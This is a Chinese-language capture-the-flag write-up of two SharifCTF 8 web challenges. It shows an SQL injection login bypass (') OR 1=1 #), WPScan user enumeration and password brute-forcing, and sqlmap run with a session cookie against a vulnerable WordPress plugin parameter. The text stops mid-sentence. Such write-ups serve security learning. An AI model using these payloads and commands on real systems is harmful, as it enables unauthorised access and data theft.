# SharifCTF 8 2018 - Notes

## Hidden input
> Description:
>
> Login if you can :)

打開題目頁面
![image](6ZQPdRZ.png)

直接看 source code
```

<!DOCTYPE html>
<html>
<head>
	<title></title>
	<link href='fonts.css' rel='stylesheet' type='text/css'>
	<link rel="stylesheet" type="text/css" href="asset/style.css">
</head>
<body>
	<div class="logo"><div class="lspan">SharifCTF</div></div>
	<form method="POST" action="login.php">
		<div class="login-block">
			<h1>Login</h1>
			<input type="text" value="" placeholder="Username" id="Username" name="Username"/>
			<input type="password" value="" placeholder="Password" id="Password" name="Password"/>
			<input type="hidden" name="debug" id="debug" value="0">
			<button>Login</button>
		</div>
	</form>
</body>
</html>

```


可以看到有一個 hidden ，且 value = 0 ，把它改成 1 然後隨便輸入來登入可以看到
```
username: user
password: pass
SQL query: SELECT * FROM users WHERE username=('user') AND password=('pass')
```

根據上面的 SQL query ，改 
username: ') OR 1=1 # 
password 隨便打，就可以 get flag 了


## The news hacker
> Description:
>
> Only admin can see the flag :)
> Hint: Weak password!

[全部參考這篇來做](https://ctftime.org/writeup/8690)

打開題目頁面
![image](../img/hQCkguA.png)

使用 Wappalyzer 可以知道是 wordpress

針對 wordpress ，使用 kali linux 內建的 WPScan

```
$ wpscan --update
## 先更新 database

$ wpscan --url http://8082.ctf.certcc.ir/ --enumerate u --threads 30 > scan.txt
## --url 接要掃描的網站
## --enumerate u 用來枚舉 username
```

可以掃到有兩個帳號，admin 和 organizer

之後暴力窮舉密碼 (admin 試不出來)

這邊我的字典檔案使用的是 kali linux 內建的
```
$ wpscan --url http://8082.ctf.certcc.ir/ --wordlist /usr/share/john/password.lst --username organizer --threads 20
```

可以得到 organizer 的密碼是 password

那就先到 `/wp-login.php` 來登入，並存好 cookie
```
organizer%7C1518282442%7CLpoQxxxm9y0vr2X3mb0dDT4IbMkh0yaERjOdSAK14wv%7Caa3fae4b5e3143e691a52253318d57d9e7604870898dd2af69a76c4e3dce9f72
```

那在剛剛的 scan.txt 裡面，觀察 plugin 中的 event list ，有寫有 SQLi

就使用 sqlmap 來看看

位置是 `http://[wordpress_site]/wp-admin/admin.php?page=el_admin_main&action=edit&id=1 AND SLEEP(10)
`

```
$ sqlmap --url="http://8082.ctf.certcc.ir/wp-admin/admin.php?page=el_admin_main&action=edit&id=1" -p id --threads=10 --sql-shell --cookie="wordpress_eb2a34d2fb7f6ae7debb807cd7821561=organizer%7C1518050175%7C8XtpMJPPznkAada2MnyIamhMcBXMS0JDAtsuKJgrw8n%7C9539ffdec564f651fe34b71327d8bf2978fb1c93883ec9be36ef9aa65552fc8f"

## 因為要用這個 sql injection 需要有登入，所以要給 cookie
## 有漏洞的地方在 id，所以用 -p id 指定 
```

之後可以在 wp_posts 的 wp_content 中找到